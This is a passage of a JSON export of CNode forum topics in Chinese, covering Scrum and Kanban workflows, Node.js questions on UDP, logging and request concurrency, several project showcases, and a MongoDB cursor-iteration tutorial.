class=\"markdown-text\"><h1>两种敏捷开发方式的工作流</h1>\n<p>敏捷开发时当今很流行的一种开发软件方式，接下来主要介绍一下两种主要的敏捷开发方式的工作流</p>\n<h2>Scrum flow</h2>\n<p>项目计划从定义backlog开始，即交付完成的产品时应该完成的用户需求列表。</p>\n<ul>\n<li>产品 backlog - 列出团队主要的 “To Do” list。 产品的代办事项列表应该包括全部的特性和 bug 修复。以便在项目结束时确认已经完成。产品的代办列表需要在工作中按照新的需求或者发现的错误持续的更新。产品的负责人负责待办事项，使其与客户的反馈和建议以及团队的工作进度同步。一些Item的优先级应该被提升或下降，一些item应该根据需求的变化增加或者减少。</li>\n<li>Sprint backlog - 包含在特定sprint中要完成的任务。sprint backlog的项目被选择为在sprint结束时交付一个完成的特性或组件。虽然sprint backlog也允许一定的灵活性和修改，但是sprint的目标应该保持不变，并且变更应该保持在最小。</li>\n<li>Sprint goal or increment - 作为sprint结果交付的可用产品。通常，sprint以展示完成的特性或组件的演示结束。在这方面，一个重要的概念是“done”的定义，它指的是要将每个用户工作视为完整的。“done”的定义可能会根据用户的情况而有所不同:它可能包含多个任务，例如开发、测试、设计、文档和表示，还可能涉及不同的团队成员。</li>\n</ul>\n<p>每个sprint都从一个计划阶段开始，在下一个sprint中选择任务。对于计划阶段，整个团队通常都会到场，包括产品负责人和Scrum Master。团队决定在sprint结束时可以交付什么，并从产品backlog中选择相应的用户工作。通过这种方式，他们将sprint backlog放在一起。</p>\n<p>在sprint期间，团队每天开会进行“每日scrum”，讨论他们的进展以及可能遇到的任何障碍。每日scrum的目的是尽早发现问题，并快速找到解决方案，以免中断sprint流程。</p>\n<p>在sprint之后，涉众将审查完成的特性。在sprint评审期间，团队有机会收到关于他们工作的反馈，以及变更建议(如果有的话)。</p>\n<p>与此同时，团队开会进行sprint回顾，分析他们刚刚完成的sprint，并找到可以改进的地方。回顾之后，流程被重置，新的sprint从计划阶段开始。</p>\n<p><img src=\"https://da-14.com/sites/default/files/pictures/kanban-vs-scrum-workflow-sprint-development.jpg\" alt=\"''\"></p>\n<h2>Kanban flow</h2>\n<p>在 Kanban中，没有要求需要在一个确定的时间点完成一定数量的工作。相反，Kanban专注于平衡团队的当前正在进行的工作的能力。</p>\n<p>一个 Kanban 项目流程从一般的backlog开始,包含所有的应该完成的任务。每个团队成员从backlog中为自己挑选一个任务，并集中精力完成它。当任务完成时，成员选择下一个任务，以此类推，直到所有任务完成为止。待办事项列表的优先级是将最紧急的任务放在顶部，由团队首先处理。</p>\n<p>在Kanban中，重要的是在项目期间的任何时候，正在进行的工作量都不能超过团队的能力。为此目的，有可能根据现有的能力为任何类型的工作定一个限度。</p>\n<p>产品负责人可以尽可能频繁地设置和更改backlog中的优先级，因为backlog管理对团队的性能没有影响。团队只关心正在进行的工作，只有在当前任务完成后才返回到backlog。</p>\n<p>每个任务都沿着“To Do”—“Work in Progress”—“Done”路线进行。当然，Kanban也支持“完成”定义的概念，这是每个任务接受的标准。</p>\n<p>总而言之，我们可以说Scrum的主要区别在于它试图在指定的时间内完成预定的工作，而Kanban确保正在进行的工作永远不会超过设定的限制。</p>\n<h2>如何选择</h2>\n<p>如果你一直在等待这个问题的最终答案，我们可能会让你失望。到目前为止，我们希望已经成功地证明了这两种方法都有它们的优点，并且都可以帮助建立敏捷开发过程。然而，我们提供了一些指导方针，可以帮助您选择最适合您的团队的方法。</p>\n<h3>使用 Scrim</h3>\n<ul>\n<li>你可以相对容易地将工作划分为逻辑块，这些逻辑块可以在两周内完成。</li>\n<li>你需要对整个项目有高度的可预测性。Scrum专注于将sprint中的变更保持在最小。</li>\n<li>你的团队里有很多新成员。使用Scrum，如果需要的话，他们会更容易理解团队纪律并做出改进。</li>\n</ul>\n<h3>使用 Kanban</h3>\n<ul>\n<li>你期望项目中有很多频繁的变更。</li>\n<li>很难隔离能够在两周内交付的产品组件。</li>\n<li>你的团队纪律严明，可以信任他们会在没有严格截止日期的情况下安排他们的活动。</li>\n</ul>\n</div>","title":"两种敏捷开发方式的工作流介绍","last_reply_at":"2019-04-07T05:11:47.588Z","good":false,"top":false,"reply_count":0,"visit_count":529,"create_at":"2019-04-07T05:11:47.588Z","author":{"loginname":"lvwxx","avatar_url":"https://avatars2.githubusercontent.com/u/15207681?v=4&s=120"}},{"id":"5ca95340d68ff5064921a8e6","author_id":"5941d0829079357b642b2771","tab":"ask","content":"<div class=\"markdown-text\"><p>请问：如何才算将nodejs精通了？</p>\n</div>","title":"请问：如何才算将nodejs精通了？","last_reply_at":"2019-04-07T02:13:17.941Z","good":false,"top":false,"reply_count":2,"visit_count":727,"create_at":"2019-04-07T01:32:48.976Z","author":{"loginname":"lililbwl","avatar_url":"https://avatars1.githubusercontent.com/u/13088143?v=4&s=120"}},{"id":"5ca6bba46c1de62dce46809f","author_id":"50b5bc5d637ffa4155091236","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>var dgram     = require(&#x27;dgram&#x27;)\nvar udp       = dgram.createSocket(&#x27;udp4&#x27;)\n\nudp.on(&#x27;message&#x27;, function(data, ipdr) {\n  console.log(&#x27;message&#x27;)\n  console.log(data.toString())\n  console.log(ipdr)\n})\n\nudp.on(&#x27;error&#x27;, function(err) {\n  console.log(&#x27;error&#x27;)\n  console.log(arguments)\n})\n\nudp.on(&#x27;listening&#x27;, function(err) {\n  console.log(&#x27;listening&#x27;)\n  console.log(arguments)\n})\n\nudp.bind(8090)\nconsole.log(&#x27;udp listening on port 8090&#x27;)\n\n\nvar send = function(message, port, host) {\n  console.log(&#x27;send&#x27;)\n  console.log(arguments)\n  udp.send(Buffer.from(message), port || 8090, host || &#x27;localhost&#x27;)\n}\n\n \nif (require.main === module) {\n  var port = parseInt(process.argv[2])\n  var host = process.argv[3]\n  if (port) {\n    send(&#x27;echo&#x27;, port, host)\n  } else {\n    send(&#x27;echo&#x27;)\n  }\n}\n\n\n\n\n</code></pre><p>在本地服务器可以连接，布署在阿里云服务器上用客户端连就没反应</p>\n</div>","title":"阿里云给的是内网ip ,是不是就没法实现udp连接了？","last_reply_at":"2019-04-06T03:24:02.766Z","good":false,"top":false,"reply_count":2,"visit_count":371,"create_at":"2019-04-05T02:21:24.944Z","author":{"loginname":"yakczh","avatar_url":"https://avatars3.githubusercontent.com/u/6591466?v=4&s=120"}},{"id":"5c95dc1dfd41137eb7660bd2","author_id":"5c95d7eefd41137eb7660bbf","tab":"ask","content":"<div class=\"markdown-text\"><p>由于node本身异步的机制，打印日志也是异步的，而不是一个请求对应一个完整的日志过程，在请求并发的时候日志都是混乱的，请问大佬们平时都是怎么做的，希望大家可以互相讨论学习下</p>\n</div>","title":"node如何做到日志“同步”","last_reply_at":"2019-04-05T07:46:02.561Z","good":false,"top":false,"reply_count":10,"visit_count":1067,"create_at":"2019-03-23T07:11:25.195Z","author":{"loginname":"newJack12","avatar_url":"https://avatars1.githubusercontent.com/u/38709773?v=4&s=120"}},{"id":"5ca63a1031010b2dfbb43674","author_id":"5c3a86a23898674067a7e824","tab":"share","content":"<div class=\"markdown-text\"><h2>缘起</h2>\n<p>考完 Final 又是一个 Spring Break，10 天很无聊啊，人一无聊就想写代码，但是前面写守望 UI  CSS 的时候写伤了，而且 Spring Break 就 10 天，实在不想写一个大项目。</p>\n<p>有一天听到了古巨基的《爱与诚》里面唱的：<strong>“做只🐱做只🐶不做情人”</strong>。不如就做一个阿猫阿狗的 APP 吧，当然单做一个简单的 APP 又是写写页面，不好玩，所以这个 APP 用了三大框架都写了一次。UI 框架也用了之前没怎么用过的 Material UI，NG-ZORRO。</p>\n<h2>Demo</h2>\n<p>每个框架产出的 APP 都放在不只的 URL 里，所以就写了个简陋的首面将它们集中一起啦</p>\n<ul>\n<li>\n<p><a href=\"https://haixiang6123.github.io/awesome-a-cat-a-dog/\">Home page is here!</a></p>\n</li>\n<li>\n<p><a href=\"https://github.com/Haixiang6123/awesome-a-cat-a-dog\">Github: awesome-a-cat-a-dog</a></p>\n</li>\n</ul>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/5/169e951a8581ac52?w=3360&amp;h=1864&amp;f=png&amp;s=177708\" alt></p>\n<p>App 的布局就参照 XX 软件写的，咳咳，这个 XX 你们可以猜猜，下面是 Vue 版的阿猫阿狗。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/5/169e951cb8cab1e2?w=3360&amp;h=1850&amp;f=png&amp;s=1189817\" alt=\"Vue\"></p>\n<h2>后记</h2>\n<p>写了一遍对这三大框架的差异也有一个更大的了解，反正就是写 Vue 的时候觉得 React 简洁，没有太多约束想干嘛就干嘛，写 React 的时候又觉得 Vue 有约束爽，直接套 Vue 里的东西就搞定了，简单。写 Angular 又觉得啥都是官方的，用起来更放心，文档很全，就是太麻烦了文件名字也太长了点 8。</p>\n<p>看了那么多知乎上的什么“三大框架对比”其实不如自己用一次来得舒服，理解更深刻。所以 <strong>纸上得来终觉浅，绝知此事要躬行</strong> 呀</p>\n<hr>\n<h2>技术栈/库（补）</h2>\n<p>这可能不是一个特别创新的项目，只是熟悉一下三大框架的同时，也用一下以前没用过的库。下面是这个项目的技术栈。</p>\n<h3>API</h3>\n<ul>\n<li>猫猫的 API：<a href=\"https://thecatapi.com/\">thecatapi.com</a></li>\n<li>狗狗的 API：<a href=\"https://thedogapi.com/\">thedogapi.com</a></li>\n</ul>\n<h3>React</h3>\n<ul>\n<li>React，React Router，Redux</li>\n<li>TypeScript</li>\n<li>Scss</li>\n<li>Axios</li>\n<li>Material UI x React</li>\n</ul>\n<h3>Vue</h3>\n<ul>\n<li>Vue，Vue Router，Vuex</li>\n<li><s>Material x Vue</s> (太坑了，写到一半实在写不下去了，还是用回 Element UI)</li>\n<li>Axios</li>\n<li>Scss</li>\n</ul>\n<h2>Angular</h2>\n<ul>\n<li>Angular (TypeScript 路由什么的都包了)</li>\n<li>Axios (有个地方查了 Google 半天， 用 Angular 的 HttpClient 实在解决不了，只能用一下 Axios)</li>\n</ul>\n</div>","title":"你们这些阿猫🐱阿狗🐶，做只猫🐱做只狗🐶不要做情人啊","last_reply_at":"2019-04-04T17:08:32.352Z","good":false,"top":false,"reply_count":0,"visit_count":650,"create_at":"2019-04-04T17:08:32.352Z","author":{"loginname":"Haixiang6123","avatar_url":"https://avatars1.githubusercontent.com/u/17061654?v=4&s=120"}},{"id":"5ca5fea631010b2dfbb43604","author_id":"55c56e8a39273b9219336288","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>原文： <a href=\"https://github.com/t9tio/tomato-pie/blob/master/blog/stay_focus_when_doing_tomato.md\">https://github.com/t9tio/tomato-pie/blob/master/blog/stay_focus_when_doing_tomato.md</a></p>\n</blockquote>\n<h3>关于 tomato-pie 的前序介绍</h3>\n<ul>\n<li><a href=\"https://www.v2ex.com/t/538331#reply24\">https://www.v2ex.com/t/538331#reply24</a></li>\n<li><a href=\"https://www.v2ex.com/t/547816#reply8\">https://www.v2ex.com/t/547816#reply8</a></li>\n</ul>\n<h3>缘起</h3>\n<p>最近在阅读 <a href=\"https://en.wikipedia.org/wiki/Getting_Things_Done\">Getting Things Done\n</a> by <a href=\"https://en.wikipedia.org/wiki/David_Allen_(author)\">David Allen</a>。里面提到的一个点很触动到我 – 关注 “next action” 而不是同时思考着很多事情。整理好自己的 todo list 们，排好优先级之后，只关注接下来你要做的事情并且专注于此。这样的工作方式下自己会更专注，感受到的压力更小，从而更有效率。</p>\n<h3>Tomato pie 的 “next action”</h3>\n<p>于是顺手给 tomato-pie 加了一个功能: 当你在为某个 todo 做番茄时，将其他 todo 模糊掉：</p>\n<p><img src=\"https://raw.githubusercontent.com/timqian/images/master/focusing_mode.gif\" alt></p>\n<h3>欢迎安装试用</h3>\n<ul>\n<li><a href=\"https://chrome.google.com/webstore/detail/gffgechdocgfajkbpinmjjjlkjfjampi\">从 chrome web store 安装试用</a></li>\n<li><a href=\"https://github.com/t9tio/tomato-pie\">Github 上的源代码</a></li>\n<li><a href=\"https://spectrum.chat/t9tio\">加入 t9t.io spectrum 群</a></li>\n<li><a href=\"https://user-images.githubusercontent.com/5512552/40399903-53d1ebde-5e72-11e8-98d8-615fc40c09f1.jpeg\">加入 t9t.io 微信群</a></li>\n</ul>\n</div>","title":"读 GTD 时间管理法有感以及 tomato-pie 的一个新 feature","last_reply_at":"2019-04-04T12:55:02.160Z","good":false,"top":false,"reply_count":0,"visit_count":264,"create_at":"2019-04-04T12:55:02.160Z","author":{"loginname":"timqian","avatar_url":"https://avatars3.githubusercontent.com/u/5512552?v=4&s=120"}},{"id":"5ca5ac5a31010b2dfbb433f8","author_id":"5ca5abdf31010b2dfbb433ec","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Frs9ZKsJnbrDMBacBzDz66QF__PV\" alt=\"node.png\"></p>\n<p>请问这是怎么回事？</p>\n</div>","title":"关于node gm模块图片处理的问题","last_reply_at":"2019-04-04T11:04:23.512Z","good":false,"top":false,"reply_count":3,"visit_count":516,"create_at":"2019-04-04T07:03:54.020Z","author":{"loginname":"blackyhb","avatar_url":"https://avatars1.githubusercontent.com/u/29148005?v=4&s=120"}},{"id":"5c9600c800bcfd7eb2be5484","author_id":"4efc278625fa69ac69000229","tab":"ask","content":"<div class=\"markdown-text\"><p>我在深圳，做了差不多10年程序员，以前是做游戏前端的，后来也做Web前端，然后是Web全栈，后端用Node，后来做游戏又用Node，差不多有三四年Node经验了，但是相对于Java、PHP等后端，Node的应用不是很广而且比较偏，现在找工作挺难的。</p>\n<p>之前公司招人也挺难的，因为Java、PHP转Node的人很少，大部分是前端转过去的，对后端的积累不深，不大满足要求。</p>\n<p>我现在就是处于这样尴尬的地位，虽然最近花了不少时间去积累后端深层技能，但是仍然不够自信。</p>\n<p>我最近在考虑要不要重新回到前端方向去。毕竟前端现在也越来越复杂。前后端全栈，一边调试CSS，一边研究Linux内核，感觉精力实在不足啊。</p>\n<p>不过考虑未来30年的职业发展，我肯定还是会全面发展的。只是近期比较尴尬，又到了养家糊口的年纪。</p>\n</div>","title":"前端转Node后端会很尴尬吗？","last_reply_at":"2019-04-04T08:39:57.050Z","good":false,"top":false,"reply_count":45,"visit_count":2725,"create_at":"2019-03-23T09:47:52.134Z","author":{"loginname":"lushisang","avatar_url":"https://avatars0.githubusercontent.com/u/197572?v=4&s=120"}},{"id":"5ca46b936c1de62dce467702","author_id":"5ca4678731010b2dfbb42c4b","tab":"ask","content":"<div class=\"markdown-text\"><p>抓取 cnode 社区首页的 40 条文章链接\n然后再对 40 条链接发起请求\n然后发现同时请求太多，会返回 503\n我就直接折腾，封装了一个控制 同时请求 的数量的函数，应该是叫 并发控制 吧。\n不过，有点问题，当我设置为 7 个并发时，就少了 7 条返回，设置为 2 条并发时，就少了 2 条返回。\n我想自己封装，不使用其他包\n以下为代码：</p>\n<pre class=\"prettyprint language-js\"><code>const axios = require(&#x27;axios&#x27;);\nconst cheerio = require(&#x27;cheerio&#x27;);\nconst url = require(&#x27;url&#x27;);\n\nconst href = &#x27;https:&#x2F;&#x2F;cnodejs.org&#x27;;\n\n&#x2F;&#x2F; 抓取url\naxios.get(href)\n      .then(res =&gt; {\n        let $ = cheerio.load(res.data);\n        let node = $(&#x27;#topic_list a.topic_title&#x27;);\n        let list = [];\n        node.each((index, value) =&gt; list.push(url.resolve(href, value.attribs.href)));\n        return list;\n      })\n      .then(list =&gt; {\n\t  &#x2F;&#x2F; 7 个并发\n        many(list, 7).then(data =&gt; console.log(data)).catch(err =&gt; console.log(err));\n\n      })\n      .catch(err =&gt; err);\n\n\n&#x2F;&#x2F; 多线程异步,并发\nfunction many (arr, n) {\n  return new Promise((resolve, reject) =&gt; {\n    &#x2F;&#x2F; 多线程统一数据存放\n    let list = [];\n    &#x2F;&#x2F; 正在运行的线程数\n    let thread = 0;\n    &#x2F;&#x2F; 队列\n    let length = 0;\n\n    &#x2F;&#x2F; 单线程异步\n    function queues (arr) {\n      return new Promise((resolve, reject) =&gt; {\n        &#x2F;&#x2F; 队列数据统一存放\n        let datas = [];\n        function queue (arr) {\n          length ++;\n          return new Promise((resolve, reject) =&gt; {\n          axios.get(arr[length-1])\n                .then(res =&gt; {\n                  if (length &lt; arr.length) {\n                    console.log(&#x27;...&#x27; + length);\n                    datas.push(res.data);\n                    return queue(arr).then(() =&gt; resolve());\n                  }\n                  else {\n                    resolve();\n                  }\n      \n      \n                })\n                .catch(err =&gt; reject(err));\n          });\n      \n        }\n      \n        queue(arr).then(() =&gt; resolve(datas))\n      });\n    }\n\n    &#x2F;&#x2F; 多线程创建\n    for (let i = 0; i &lt; n; i ++) {\n      thread++;\n      queues(arr)\n                .then(data =&gt; {\n                  list.push(data);\n                  thread--;\n                  if (thread === 0) {\n\t\t\t\t  &#x2F;&#x2F; 最后一个线程返回数据\n                    resolve(list);\n                  }\n                })\n                .catch(err =&gt; reject(err));\n    }\n\n  });\n}\n</code></pre><p>返回：\n<img src=\"//static.cnodejs.org/FtODHULPfaIfCJFu-FeXF-wUfxbi\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FoBs1-kL9wuIwcqqb714k_tRP8Nf\" alt=\"image.png\"></p>\n</div>","title":"并发控制问题","last_reply_at":"2019-04-04T07:22:26.860Z","good":false,"top":false,"reply_count":3,"visit_count":543,"create_at":"2019-04-03T08:15:15.982Z","author":{"loginname":"tingzhong666","avatar_url":"https://avatars0.githubusercontent.com/u/47524168?v=4&s=120"}},{"id":"5ca5a4e86c1de62dce467d75","author_id":"56fdcb26c5f5b4a959e91751","tab":"share","content":"<div class=\"markdown-text\"><p>极客教程-致力于推广各种编程语言技术，也为了未来数字化世界，让人更容易找到操作数字化的方式，为了未来而生的编程学习平台。</p>\n<p>优化了写作方式（类简书式，更友好）。如下图：</p>\n<p><img src=\"//static.cnodejs.org/Fh4GgpAT-sBntotCsCexsP_FYz1n\" alt=\"QQ20190404-142843@2x.png\">\n<img src=\"//static.cnodejs.org/FnLeguxk7154pelL9d5hTdEuokrx\" alt=\"QQ20190404-142938@2x.png\"></p>\n<p>欢迎体验, 地址: <a href=\"https://www.geekjc.com\">https://www.geekjc.com</a></p>\n</div>","title":"程序猿界的简书写作学习平台","last_reply_at":"2019-04-04T06:32:08.963Z","good":false,"top":false,"reply_count":0,"visit_count":612,"create_at":"2019-04-04T06:32:08.963Z","author":{"loginname":"cllgeek","avatar_url":"https://avatars0.githubusercontent.com/u/15187909?v=4&s=120"}},{"id":"5ca1e9dc31010b2dfbb41f35","author_id":"516cc5936d382773065b8e2f","tab":"share","content":"<div class=\"markdown-text\"><p>最近项目需要缓存一批二维码的点阵信息,\n最开始用二维数组存,发现太占资源,\n后来改用 Uint8Array 好了点,<br>\n想找个直接以bit为单元存储的类,结果没有;\n然后就有这个 <a href=\"https://github.com/cnwhy/BitMatrix\">BitMatrix</a>;</p>\n<p>用 ArrayBuffer来存储数据, 并把每个byte再拆成bit来用.   最终效果还是可以的, 有兴趣的可以关注一下, API还在完善中</p>\n<pre class=\"prettyprint\"><code>用 1 填充 2000 个 100*100 矩阵 内存占用情况:\n┌─────────┬──────────────────────┬────────────┬────────────┬────────────┐\n│ (index) │      className       │  heapUsed  │  external  │    sum     │\n├─────────┼──────────────────────┼────────────┼────────────┼────────────┤\n│    0    │     &#x27;BitMatrix&#x27;      │  &#x27;0.77MB&#x27;  │  &#x27;2.38MB&#x27;  │  &#x27;3.16MB&#x27;  │\n│    1    │     &#x27;Int8Matrix&#x27;     │  &#x27;0.87MB&#x27;  │ &#x27;19.07MB&#x27;  │ &#x27;19.94MB&#x27;  │\n│    2    │    &#x27;Uint8Matrix&#x27;     │  &#x27;0.81MB&#x27;  │ &#x27;19.07MB&#x27;  │ &#x27;19.89MB&#x27;  │\n│    3    │ &#x27;Uint8ClampedMatrix&#x27; │  &#x27;0.76MB&#x27;  │ &#x27;19.07MB&#x27;  │ &#x27;19.83MB&#x27;  │\n│    4    │    &#x27;Int16Matrix&#x27;     │  &#x27;0.68MB&#x27;  │ &#x27;38.15MB&#x27;  │ &#x27;38.83MB&#x27;  │\n│    5    │    &#x27;Uint16Matrix&#x27;    │  &#x27;0.68MB&#x27;  │ &#x27;38.15MB&#x27;  │ &#x27;38.83MB&#x27;  │\n│    6    │    &#x27;Int32Matrix&#x27;     │  &#x27;0.51MB&#x27;  │ &#x27;76.29MB&#x27;  │ &#x27;76.80MB&#x27;  │\n│    7    │    &#x27;Uint32Matrix&#x27;    │  &#x27;0.53MB&#x27;  │ &#x27;76.29MB&#x27;  │ &#x27;76.82MB&#x27;  │\n│    8    │   &#x27;Float32Matrix&#x27;    │  &#x27;0.53MB&#x27;  │ &#x27;76.29MB&#x27;  │ &#x27;76.82MB&#x27;  │\n│    9    │   &#x27;Float64Matrix&#x27;    │  &#x27;0.52MB&#x27;  │ &#x27;152.59MB&#x27; │ &#x27;153.11MB&#x27; │\n│   10    │     &#x27;AnyMatrix&#x27;      │ &#x27;153.23MB&#x27; │  &#x27;0.00MB&#x27;  │ &#x27;153.23MB&#x27; │\n│   11    │ &#x27;AnyMatrixUseObject&#x27; │ &#x27;159.15MB&#x27; │  &#x27;0.00MB&#x27;  │ &#x27;159.15MB&#x27; │\n└─────────┴──────────────────────┴────────────┴────────────┴────────────┘\n</code></pre></div>","title":"分享一个 Bit矩阵","last_reply_at":"2019-04-04T05:36:53.527Z","good":false,"top":false,"reply_count":5,"visit_count":473,"create_at":"2019-04-01T10:37:16.736Z","author":{"loginname":"cnwhy","avatar_url":"https://avatars1.githubusercontent.com/u/4178465?v=4&s=120"}},{"id":"5ca5696b6c1de62dce467b5e","author_id":"5ca5676631010b2dfbb430f2","tab":"ask","content":"<div class=\"markdown-text\"><p>想要通过日志或者console.log来记录运行过程中每个模块的引入（require或者import），有什么官方API或者可以通过自己改造的方法来实现吗？</p>\n</div>","title":"请问nodejs如何监控每个模块的引入","last_reply_at":"2019-04-04T05:29:43.607Z","good":false,"top":false,"reply_count":4,"visit_count":524,"create_at":"2019-04-04T02:18:19.640Z","author":{"loginname":"Zrylhh","avatar_url":"https://avatars1.githubusercontent.com/u/22956655?v=4&s=120"}},{"id":"5c92e30b96558e26e1b67efb","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><ul>\n<li>GitHub 仓库：<a href=\"https://github.com/Fundebug/loop-mongodb-big-collection\">Fundebug/loop-mongodb-big-collection</a></li>\n</ul>\n<p><img src=\"https://image.fundebug.com/2019-03-21-mongodb.jpg\" alt></p>\n<p>本文使用的编程语言是 Node.js，连接 MongoDB 的模块用的是<a href=\"https://mongoosejs.com/\">mongoose</a>。但是，本文介绍的方法适用于其他编程语言及其对应的 MongoDB 模块。</p>\n<h3>错误方法：find()</h3>\n<p>也许，在遍历 MongoDB 集合时，我们会这样写：</p>\n<pre class=\"prettyprint language-javascript\"><code>const Promise = require(&quot;bluebird&quot;);\n\nfunction findAllMembers() {\n    return Member.find();\n}\n\nasync function test() {\n    const members = await findAllMembers();\n    let N = 0;\n    await Promise.mapSeries(members, member =&gt; {\n        N++;\n        console.log(&#96;name of the ${N}th member: ${member.name}&#96;);\n    });\n    console.log(&#96;loop all ${N} members success&#96;);\n}\n\ntest();\n</code></pre><p>注意，我们使用的是 Bluebird 的<a href=\"http://bluebirdjs.com/docs/api/promise.mapseries.html\">mapSeries</a>而非<a href=\"http://bluebirdjs.com/docs/api/promise.map.html\">map</a>，members 数组中的元素是一个一个处理的。这样就够了吗？</p>\n<p>当 Member 集合中的 document 不多时，比如只有 1000 个时，那确实没有问题。但是当 Member 集合中有 1000 万个 document 时，会发生什么呢？如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&lt;--- Last few GCs ---&gt;\nrt of marking 1770 ms) (average mu = 0.168, current mu = 0.025) finalize [5887:0x43127d0]    33672 ms: Mark-sweep 1398.3 (1425.2) -&gt; 1398.0 (1425.7) MB, 1772.0 &#x2F; 0.0 ms  (+ 0.1 ms in 12 steps since start of marking, biggest step 0.0 ms, walltime since start of marking 1775 ms) (average mu = 0.088, current mu = 0.002) finalize [5887:0x43127d0]    35172 ms: Mark-sweep 1398.5 (1425.7) -&gt; 1398.4 (1428.7) MB, 1496.7 &#x2F; 0.0 ms  (average mu = 0.049, current mu = 0.002) allocation failure scavenge might not succeed\n\n\n&lt;--- JS stacktrace ---&gt;\n\nFATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory\n 1: 0x8c02c0 node::Abort() [node]\n 2: 0x8c030c  [node]\n 3: 0xad15de v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [node]\n 4: 0xad1814 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [node]\n 5: 0xebe752  [node]\n 6: 0xebe858 v8::internal::Heap::CheckIneffectiveMarkCompact(unsigned long, double) [node]\n 7: 0xeca982 v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) [node]\n 8: 0xecb2b4 v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [node]\n 9: 0xecba8a v8::internal::Heap::FinalizeIncrementalMarkingIfComplete(v8::internal::GarbageCollectionReason) [node]\n10: 0xecf1b7 v8::internal::IncrementalMarkingJob::Task::RunInternal() [node]\n11: 0xbc1796 v8::internal::CancelableTask::Run() [node]\n12: 0x935018 node::PerIsolatePlatformData::FlushForegroundTasksInternal() [node]\n13: 0x9fccff  [node]\n14: 0xa0dbd8  [node]\n15: 0x9fd63b uv_run [node]\n16: 0x8ca6c5 node::Start(v8::Isolate*, node::IsolateData*, int, char const* const*, int, char const* const*) [node]\n17: 0x8c945f node::Start(int, char**) [node]\n18: 0x7f84b6263f45 __libc_start_main [&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6]\n19: 0x885c55  [node]\nAborted (core dumped)\n</code></pre><p>可知，内存不足了。</p>\n<p>打印<a href=\"https://mongoosejs.com/docs/api.html#model_Model.find\">find()</a>返回的 members 数组可知，集合中所有元素都返回了，<strong>哪个数组放得下 1000 万个 Object?</strong></p>\n<h3>正确方法：find().cursor()与 eachAsync()</h3>\n<p>将整个集合 find()全部返回，这种操作应该避免，正确的方法应该是这样的：</p>\n<pre class=\"prettyprint language-javascript\"><code>function findAllMembersCursor() {\n    return Member.find().cursor();\n}\n\nasync function test() {\n    const membersCursor = await findAllMembersCursor();\n    let N = 0;\n    await membersCursor.eachAsync(member =&gt; {\n        N++;\n        console.log(&#96;name of the ${N}th member: ${member.name}&#96;);\n    });\n    console.log(&#96;loop all ${N} members success&#96;);\n}\n\ntest();\n</code></pre><p>使用<a href=\"https://mongoosejs.com/docs/api.html#query_Query-cursor\">cursor()</a>方法返回 QueryCursor，然后再使用<a href=\"https://mongoosejs.com/docs/api.html#querycursor_QueryCursor-eachAsync\">eachAsync()</a>就可以遍历整个集合了，而且不用担心内存不够。</p>\n<p><a href=\"https://mongoosejs.com/docs/api.html#QueryCursor\">QueryCursor</a>是什么呢？不妨看一下 mongoose 文档：</p>\n<blockquote>\n<p>A QueryCursor is a concurrency primitive for processing query results one document at a time. A QueryCursor fulfills the Node.js streams3 API, in addition to several other mechanisms for loading documents from MongoDB one at a time.</p>\n</blockquote>\n<p>总之，QueryCursor 可以每次从 MongoDB 中取一个 document，这样显然极大地减少了内存使用。</p>\n<h3>如何测试？</h3>\n<p>这篇博客介绍的内容很简单，但是也很容易被忽视。如果大家测试一下，印象会更加深刻一些。</p>\n<p>测试代码很简单，大家可以查看<a href=\"https://github.com/Fundebug/loop-mongodb-big-collection\">Fundebug/loop-mongodb-big-collection</a>。</p>\n<p>我的测试环境是这样的：</p>\n<ul>\n<li>ubuntu 14.04</li>\n<li>mongodb 3.2</li>\n<li>nodejs 10.9.0</li>\n</ul>\n<p><strong>1. 使用 Docker 运行 MongoDB</strong></p>\n<pre class=\"prettyprint language-bash\"><code>sudo docker run --net=host -d --name mongodb daocloud.io&#x2F;library&#x2F;mongo:3.2\n</code></pre><p><strong>2. 使用<a href=\"https://github.com/feliixx/mgodatagen\">mgodatagen</a>生成测试数据</strong></p>\n<p>使用 mgodatagen，1000 万个 document 可以在 1 分多钟生成！</p>\n<p>下载 mgodatagen：<a href=\"https://github.com/feliixx/mgodatagen/releases/download/0.7.3/mgodatagen_linux_x86_64.tar.gz\">https://github.com/feliixx/mgodatagen/releases/download/0.7.3/mgodatagen_linux_x86_64.tar.gz</a></p>\n<p>解压之后，复制到/usr/local/bin 目录即可：</p>\n<pre class=\"prettyprint language-bash\"><code>sudo mv mgodatagen &#x2F;usr&#x2F;local&#x2F;bin\n</code></pre><p>mgodatagen 的配置文件<a href=\"https://github.com/Fundebug/loop-mongodb-big-collection/blob/master/mgodatagen-config.json\">mgodatagen-config.json</a>如下：</p>\n<pre class=\"prettyprint language-json\"><code>[\n    {\n        &quot;database&quot;: &quot;test&quot;,\n        &quot;collection&quot;: &quot;members&quot;,\n        &quot;count&quot;: 10000000,\n        &quot;content&quot;: {\n            &quot;name&quot;: {\n                &quot;type&quot;: &quot;string&quot;,\n                &quot;minLength&quot;: 2,\n                &quot;maxLength&quot;: 8\n            },\n            &quot;city&quot;: {\n                &quot;type&quot;: &quot;string&quot;,\n                &quot;minLength&quot;: 2,\n                &quot;maxLength&quot;: 8\n            },\n            &quot;country&quot;: {\n                &quot;type&quot;: &quot;string&quot;,\n                &quot;minLength&quot;: 2,\n                &quot;maxLength&quot;: 8\n            },\n            &quot;company&quot;: {\n                &quot;type&quot;: &quot;string&quot;,\n                &quot;minLength&quot;: 2,\n                &quot;maxLength&quot;: 8\n            },\n            &quot;email&quot;: {\n                &quot;type&quot;: 